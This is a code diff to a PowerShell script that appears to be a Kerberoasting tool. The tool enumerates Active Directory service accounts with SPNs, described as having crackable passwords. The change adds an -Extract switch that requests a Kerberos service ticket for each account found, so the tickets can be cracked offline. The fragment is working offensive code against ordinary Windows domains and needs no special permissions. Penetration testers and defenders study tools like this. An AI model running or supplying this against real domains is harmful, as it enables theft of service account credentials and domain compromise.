@@ -7,12 +7,14 @@
 #           a crackable password. This tool will find those accounts. You do not
 #           need any special local or domain permissions to run this script. 
 #           This script on a script supplied by Microsoft (details below).
-# History:    2014/11/12     Tim Medin    Created
+# History:  2014/11/12     Tim Medin    Created
+#           2016/04/12     Tim Medin    Added -Extract option to automatically get the tickets
 
 [CmdletBinding()]
 Param(
   [Parameter(Mandatory=$False,Position=1)] [string]$GCName,
-  [Parameter(Mandatory=$False)] [string]$Filter
+  [Parameter(Mandatory=$False)] [string]$Filter,
+  [Parameter(Mandatory=$False)] [switch]$Extract
 )
 
 Add-Type -AssemblyName System.IdentityModel
@@ -102,6 +104,9 @@ ForEach ($GC in $GCs) {
                 @{Name="MemberOf";             Expression={$result.Properties["memberof"][0].ToString()} }, `
                 @{Name="PasswordLastSet";      Expression={[datetime]::fromFileTime($result.Properties["pwdlastset"][0])} } #, `
                 #@{Name="DistinguishedName";    Expression={$result.Properties["distinguishedname"][0].ToString()} }
+            if ($Extract) {
+              New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList $spn.ToString()
+            }
           }
     }
 }
